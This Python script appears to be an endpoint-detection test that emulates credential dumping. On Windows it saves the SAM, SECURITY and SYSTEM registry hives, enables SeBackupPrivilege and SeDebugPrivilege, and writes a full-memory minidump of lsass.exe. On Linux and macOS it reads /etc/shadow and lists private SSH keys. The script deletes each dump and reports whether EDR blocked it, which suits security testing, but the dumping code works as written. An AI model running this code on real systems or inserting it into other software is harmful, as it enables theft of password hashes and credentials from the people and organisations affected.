#!/usr/bin/env python3
# T003: Python Credential Dumper - MITRE T1059.006 + T1003.001 + T1003.002 + T1552.001

import sys
import os
import json
import platform
import tempfile
import subprocess
import time

IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"
IS_MACOS = platform.system() == "Darwin"


# ---------------------------------------------------------------------------
# Windows helpers
# ---------------------------------------------------------------------------

def _safe_unlink(path):
    try:
        if path and os.path.exists(path):
            os.remove(path)
    except Exception:
        pass


def _windows_samdump_via_reg(findings):
    detected = False
    hives = ("SAM", "SECURITY", "SYSTEM")
    for hive in hives:
        out = os.path.join(tempfile.gettempdir(),
                           f"testerpy2_{hive.lower()}_{int(time.time())}.hiv")
        try:
            proc = subprocess.run(
                ["reg.exe", "save", f"HKLM\\{hive}", out, "/y"],
                capture_output=True, text=True, timeout=15
            )
            if proc.returncode == 0 and os.path.exists(out):
                size = os.path.getsize(out)
                findings.append(f"[REG-SAVE] {hive} hive saved: {size} bytes "
                                "(SYSTEM-level access)")
            else:
                stderr = (proc.stderr or proc.stdout or "").strip().splitlines()
                msg = stderr[-1] if stderr else f"rc={proc.returncode}"
                if any(k in msg.lower() for k in ("denied", "privilege",
                                                  "blocked", "virus")):
                    findings.append(f"[REG-SAVE] {hive} BLOCKED: {msg}")
                    detected = True
                else:
                    findings.append(f"[REG-SAVE] {hive} not saved: {msg}")
        except subprocess.TimeoutExpired:
            findings.append(f"[REG-SAVE] {hive} timed out (possible EDR delay)")
            detected = True
        except FileNotFoundError:
            findings.append("[REG-SAVE] reg.exe not on PATH")
            return detected
        except Exception as e:
            findings.append(f"[REG-SAVE] {hive} error: {e}")
        finally:
            _safe_unlink(out)
    return detected


def _windows_regsavekey_native(findings):
    import ctypes
    from ctypes import wintypes

    detected = False
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)

    # Pin argtypes so strings are marshalled as LPCWSTR and DWORDs are right-sized.
    kernel32.GetCurrentProcess.restype = wintypes.HANDLE
    kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
    kernel32.CloseHandle.restype = wintypes.BOOL
    advapi32.OpenProcessToken.argtypes = [
        wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
    advapi32.OpenProcessToken.restype = wintypes.BOOL
    advapi32.LookupPrivilegeValueW.argtypes = [
        wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.c_void_p]
    advapi32.LookupPrivilegeValueW.restype = wintypes.BOOL
    advapi32.AdjustTokenPrivileges.restype = wintypes.BOOL
    advapi32.RegOpenKeyExW.argtypes = [
        wintypes.HKEY, ctypes.c_wchar_p, wintypes.DWORD,
        wintypes.DWORD, ctypes.POINTER(wintypes.HKEY)]
    advapi32.RegOpenKeyExW.restype = ctypes.c_long
    advapi32.RegSaveKeyExW.argtypes = [
        wintypes.HKEY, ctypes.c_wchar_p, ctypes.c_void_p, wintypes.DWORD]
    advapi32.RegSaveKeyExW.restype = ctypes.c_long
    advapi32.RegCloseKey.argtypes = [wintypes.HKEY]
    advapi32.RegCloseKey.restype = ctypes.c_long

    HKEY_LOCAL_MACHINE = wintypes.HKEY(0x80000002)
    KEY_READ = 0x20019
    REG_LATEST_FORMAT = 2
    TOKEN_ADJUST_PRIVILEGES = 0x20
    TOKEN_QUERY = 0x8
    SE_PRIVILEGE_ENABLED = 0x2
    ERROR_NOT_ALL_ASSIGNED = 1300

    class LUID(ctypes.Structure):
        _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]

    class LUID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]

    class TOKEN_PRIVILEGES(ctypes.Structure):
        _fields_ = [("PrivilegeCount", wintypes.DWORD),
                    ("Privileges", LUID_AND_ATTRIBUTES * 1)]

    # SeBackupPrivilege lets RegSaveKeyExW read the SAM hive without SYSTEM.
    try:
        h_token = wintypes.HANDLE()
        if advapi32.OpenProcessToken(kernel32.GetCurrentProcess(),
                                     TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                                     ctypes.byref(h_token)):
            luid = LUID()
            if advapi32.LookupPrivilegeValueW(None, "SeBackupPrivilege",
                                              ctypes.byref(luid)):
                tp = TOKEN_PRIVILEGES()
                tp.PrivilegeCount = 1
                tp.Privileges[0].Luid = luid
                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
                advapi32.AdjustTokenPrivileges(h_token, False,
                                               ctypes.byref(tp), 0, None, None)
                if ctypes.get_last_error() == ERROR_NOT_ALL_ASSIGNED:
                    findings.append("[REGSAVEKEY] SeBackupPrivilege not held "
                                    "(not running as administrator)")
            kernel32.CloseHandle(h_token)
    except Exception as e:
        findings.append(f"[REGSAVEKEY] privilege adjust failed: {e}")

    for hive in ("SAM", "SECURITY"):
        h_key = wintypes.HKEY()
        rc = advapi32.RegOpenKeyExW(HKEY_LOCAL_MACHINE, hive, 0,
                                    KEY_READ, ctypes.byref(h_key))
        if rc != 0:
            if rc == 5:
                findings.append(f"[REGSAVEKEY] {hive} open denied "
                                "(EDR or no SYSTEM)")
                detected = True
            else:
                findings.append(f"[REGSAVEKEY] {hive} open failed rc={rc}")
            continue

        out = os.path.join(tempfile.gettempdir(),
                           f"testerpy2_native_{hive.lower()}_"
                           f"{int(time.time())}.hiv")
        try:
            rc = advapi32.RegSaveKeyExW(h_key, out, None, REG_LATEST_FORMAT)
            if rc == 0 and os.path.exists(out):
                findings.append(f"[REGSAVEKEY] {hive} dumped via "
                                f"RegSaveKeyExW: {os.path.getsize(out)} bytes")
            else:
                err = ctypes.get_last_error()
                if rc == 5 or err == 5:
                    findings.append(f"[REGSAVEKEY] {hive} BLOCKED: "
                                    f"access denied (rc={rc}, err={err})")
                    detected = True
                else:
                    findings.append(f"[REGSAVEKEY] {hive} failed "
                                    f"rc={rc} err={err}")
        finally:
            advapi32.RegCloseKey(h_key)
            _safe_unlink(out)

    return detected


def _windows_lsass_minidump(findings):
    import ctypes
    from ctypes import wintypes

    detected = False
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
    psapi = ctypes.WinDLL("psapi", use_last_error=True)
    try:
        dbghelp = ctypes.WinDLL("dbghelp", use_last_error=True)
    except OSError as e:
        findings.append(f"[LSASS-DUMP] dbghelp.dll unavailable: {e}")
        return False

    # Pin all signatures so HANDLE values aren't truncated to 32-bit on Win64.
    kernel32.GetCurrentProcess.restype = wintypes.HANDLE
    kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    kernel32.OpenProcess.restype = wintypes.HANDLE
    kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
    kernel32.CloseHandle.restype = wintypes.BOOL
    kernel32.CreateFileW.argtypes = [
        ctypes.c_wchar_p, wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p,
        wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
    kernel32.CreateFileW.restype = wintypes.HANDLE
    kernel32.QueryFullProcessImageNameW.argtypes = [
        wintypes.HANDLE, wintypes.DWORD, ctypes.c_wchar_p,
        ctypes.POINTER(wintypes.DWORD)]
    kernel32.QueryFullProcessImageNameW.restype = wintypes.BOOL
    advapi32.OpenProcessToken.argtypes = [
        wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
    advapi32.OpenProcessToken.restype = wintypes.BOOL
    advapi32.LookupPrivilegeValueW.argtypes = [
        ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_void_p]
    advapi32.LookupPrivilegeValueW.restype = wintypes.BOOL
    advapi32.AdjustTokenPrivileges.restype = wintypes.BOOL
    psapi.EnumProcesses.argtypes = [
        ctypes.POINTER(wintypes.DWORD), wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD)]
    psapi.EnumProcesses.restype = wintypes.BOOL

    # SeDebugPrivilege is required for OpenProcess(PROCESS_VM_READ) on lsass.
    # Without it, the call returns ERROR_ACCESS_DENIED even as Administrator.
    TOKEN_ADJUST_PRIVILEGES = 0x20
    TOKEN_QUERY = 0x8
    SE_PRIVILEGE_ENABLED = 0x2
    ERROR_NOT_ALL_ASSIGNED = 1300

    class _LUID(ctypes.Structure):
        _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]

    class _LUID_ATTR(ctypes.Structure):
        _fields_ = [("Luid", _LUID), ("Attributes", wintypes.DWORD)]

    class _TOKEN_PRIVS(ctypes.Structure):
        _fields_ = [("PrivilegeCount", wintypes.DWORD),
                    ("Privileges", _LUID_ATTR * 1)]

    try:
        h_token = wintypes.HANDLE()
        if advapi32.OpenProcessToken(kernel32.GetCurrentProcess(),
                                     TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                                     ctypes.byref(h_token)):
            luid = _LUID()
            if advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege",
                                              ctypes.byref(luid)):
                tp = _TOKEN_PRIVS()
                tp.PrivilegeCount = 1
                tp.Privileges[0].Luid = luid
                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
                advapi32.AdjustTokenPrivileges(h_token, False,
                                               ctypes.byref(tp), 0, None, None)
                if ctypes.get_last_error() == ERROR_NOT_ALL_ASSIGNED:
                    findings.append("[LSASS-DUMP] SeDebugPrivilege not held "
                                    "- elevation required for LSASS access")
                else:
                    findings.append("[LSASS-DUMP] SeDebugPrivilege enabled")
            kernel32.CloseHandle(h_token)
    except Exception as e:
        findings.append(f"[LSASS-DUMP] privilege elevation failed: {e}")

    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_READ = 0x0010
    GENERIC_WRITE = 0x40000000
    CREATE_ALWAYS = 2
    INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
    MiniDumpWithFullMemory = 0x00000002

    # QueryFullProcessImageNameW only needs PROCESS_QUERY_LIMITED_INFORMATION,
    # so it works on PPL processes that refuse the heavier PROCESS_VM_READ
    # required by GetModuleBaseName.
    pids = (wintypes.DWORD * 4096)()
    cb_returned = wintypes.DWORD()
    if not psapi.EnumProcesses(pids, ctypes.sizeof(pids),
                               ctypes.byref(cb_returned)):
        findings.append("[LSASS-DUMP] EnumProcesses failed")
        return False

    lsass_pid = None
    for pid in pids[: cb_returned.value // ctypes.sizeof(wintypes.DWORD)]:
        if pid == 0:
            continue
        h = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                 False, pid)
        if not h:
            continue
        name_buf = ctypes.create_unicode_buffer(260)
        size = wintypes.DWORD(260)
        ok = kernel32.QueryFullProcessImageNameW(h, 0, name_buf,
                                                 ctypes.byref(size))
        kernel32.CloseHandle(h)
        if ok and name_buf.value.lower().endswith("\\lsass.exe"):
            lsass_pid = pid
            break

    if lsass_pid is None:
        findings.append("[LSASS-DUMP] lsass.exe not visible (EDR may "
                        "filter the PID list)")
        return False
    findings.append(f"[LSASS-DUMP] lsass.exe PID: {lsass_pid}")

    # 2. Open lsass with the rights MiniDumpWriteDump needs.
    h_lsass = kernel32.OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, lsass_pid)
    if not h_lsass:
        err = ctypes.get_last_error()
        # ERROR_ACCESS_DENIED=5; PPL lsass returns the same code, so both
        # surface as a detection signal.
        findings.append(f"[LSASS-DUMP] OpenProcess BLOCKED (err={err}) - "
                        "lsass is PPL or EDR is intercepting OpenProcess")
        return True

    # 3. Create a temp dump file and call MiniDumpWriteDump.
    dump_path = os.path.join(
        tempfile.gettempdir(),
        f"testerpy2_lsass_{int(time.time())}.dmp"
    )
    h_file = None
    try:
        h_file = kernel32.CreateFileW(
            dump_path, GENERIC_WRITE, 0, None, CREATE_ALWAYS, 0, None)
        if not h_file or h_file == INVALID_HANDLE_VALUE:
            err = ctypes.get_last_error()
            findings.append(f"[LSASS-DUMP] CreateFile failed (err={err})")
            h_file = None
            return False

        dbghelp.MiniDumpWriteDump.argtypes = [
            wintypes.HANDLE, wintypes.DWORD, wintypes.HANDLE,
            wintypes.DWORD, ctypes.c_void_p, ctypes.c_void_p,
            ctypes.c_void_p,
        ]
        dbghelp.MiniDumpWriteDump.restype = wintypes.BOOL

        ok = dbghelp.MiniDumpWriteDump(
            h_lsass, lsass_pid, h_file,
            MiniDumpWithFullMemory, None, None, None)
        err = ctypes.get_last_error() if not ok else 0

        # Close the file before measuring/deleting it.
        kernel32.CloseHandle(h_file)
        h_file = None

        if ok:
            size = os.path.getsize(dump_path)
            findings.append(f"[LSASS-DUMP] MiniDumpWriteDump succeeded: "
                            f"{size} bytes - credentials extractable")
        else:
            findings.append(f"[LSASS-DUMP] MiniDumpWriteDump BLOCKED "
                            f"(err={err}) - likely EDR or PPL")
            detected = True
    finally:
        if h_file:
            kernel32.CloseHandle(h_file)
        kernel32.CloseHandle(h_lsass)
        _safe_unlink(dump_path)

    return detected


def _windows_vss_enum(findings):
    try:
        proc = subprocess.run(
            ["vssadmin.exe", "list", "shadows"],
            capture_output=True, text=True, timeout=10
        )
        out = proc.stdout or ""
        if "No items found" in out:
            findings.append("[VSS] No shadow copies present")
        elif "Shadow Copy Volume" in out:
            count = out.count("Shadow Copy Volume")
            findings.append(f"[VSS] {count} shadow copies enumerable "
                            "(offline SAM extraction possible)")
        elif proc.returncode != 0:
            findings.append("[VSS] vssadmin returned non-zero "
                            "(may require admin)")
        else:
            findings.append("[VSS] enumeration complete")
    except FileNotFoundError:
        findings.append("[VSS] vssadmin.exe not on PATH")
    except subprocess.TimeoutExpired:
        findings.append("[VSS] timeout (EDR may be intercepting)")


# ---------------------------------------------------------------------------
# Main test
# ---------------------------------------------------------------------------

def run():
    result = {"status": "pending", "details": "", "detection_info": ""}
    findings = []
    detected = False

    try:
        if IS_WINDOWS:
            findings.append("=== Windows Credential Access ===")

            # Original primitive: SAM\SAM registry open via winreg
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SAM\SAM",
                                     0, winreg.KEY_READ)
                winreg.CloseKey(key)
                findings.append("[SAM] HKLM\\SAM\\SAM readable (SYSTEM)")
            except PermissionError:
                findings.append("[SAM] HKLM\\SAM\\SAM denied (expected "
                                "without SYSTEM)")
            except FileNotFoundError:
                findings.append("[SAM] HKLM\\SAM\\SAM key not found")
            except OSError as e:
                if "denied" in str(e).lower():
                    findings.append(f"[SAM] BLOCKED by EDR: {e}")
                    detected = True
                else:
                    findings.append(f"[SAM] error: {e}")

            # New primitive 1: reg.exe save (samdump)
            if _windows_samdump_via_reg(findings):
                detected = True

            # New primitive 2: native RegSaveKeyExW (regdump)
            try:
                if _windows_regsavekey_native(findings):
                    detected = True
            except Exception as e:
                findings.append(f"[REGSAVEKEY] error: {e}")

            # New primitive 3: LSASS MiniDumpWriteDump
            try:
                if _windows_lsass_minidump(findings):
                    detected = True
            except Exception as e:
                findings.append(f"[LSASS-DUMP] error: {e}")

            # Volume Shadow Copies (offline SAM)
            try:
                _windows_vss_enum(findings)
            except Exception as e:
                findings.append(f"[VSS] error: {e}")

            # DPAPI master keys
            try:
                dpapi_path = os.path.normpath(os.path.join(
                    os.environ.get("APPDATA", ""),
                    "..", "Local", "Microsoft", "Protect"))
                if os.path.exists(dpapi_path):
                    items = os.listdir(dpapi_path)
                    findings.append(f"[DPAPI] master-keys dir: "
                                    f"{len(items)} SIDs")
                else:
                    findings.append("[DPAPI] Protect directory not found")
            except PermissionError:
                findings.append("[DPAPI] BLOCKED: access denied")
                detected = True
            except Exception as e:
                findings.append(f"[DPAPI] error: {e}")

        elif IS_LINUX or IS_MACOS:
            findings.append(f"=== {'Linux' if IS_LINUX else 'macOS'} "
                            "Credential Access ===")

            try:
                with open("/etc/shadow", "r") as f:
                    lines = f.readlines()
                    findings.append(f"[SHADOW] readable: {len(lines)} "
                                    "entries (root)")
            except PermissionError:
                findings.append("[SHADOW] access denied (expected non-root)")
            except FileNotFoundError:
                findings.append("[SHADOW] file not found")
            except Exception as e:
                findings.append(f"[SHADOW] error: {e}")

            try:
                ssh_dir = os.path.expanduser("~/.ssh")
                if os.path.exists(ssh_dir):
                    keys = [f for f in os.listdir(ssh_dir)
                            if f.startswith("id_") and not f.endswith(".pub")]
                    findings.append(f"[SSH] private keys: {len(keys)}")
                    for k in keys[:3]:
                        findings.append(f"[SSH]   - {k}")
                else:
                    findings.append("[SSH] no .ssh directory")
            except PermissionError:
                findings.append("[SSH] BLOCKED: access denied")
                detected = True
            except Exception as e:
                findings.append(f"[SSH] error: {e}")

            if IS_LINUX:
                try:
                    keyring_path = os.path.expanduser(
                        "~/.local/share/keyrings")
                    if os.path.exists(keyring_path):
                        items = os.listdir(keyring_path)
                        findings.append(f"[KEYRING] {len(items)} files")
                    else:
                        findings.append("[KEYRING] no keyring directory")
                except Exception as e:
                    findings.append(f"[KEYRING] error: {e}")

            try:
                with open("/etc/passwd", "r") as f:
                    lines = f.readlines()
                    users = [l.split(":")[0] for l in lines
                             if not l.startswith("#")]
                    findings.append(f"[PASSWD] {len(users)} accounts")
            except Exception as e:
                findings.append(f"[PASSWD] error: {e}")

        result["details"] = "\n".join(findings)
        if detected:
            result["status"] = "detected"
            result["detection_info"] = (
                "EDR blocked or interfered with at least one credential "
                "access primitive (samdump / regdump / lsass-dump)")
        else:
            result["status"] = "success"

    except Exception as e:
        result["status"] = "failed"
        result["details"] = f"Unexpected error: {e}"

    return result


if __name__ == "__main__":
    out = run()
    print(json.dumps(out))
    sys.exit(0 if out["status"] in ("success", "detected", "skipped") else 1)
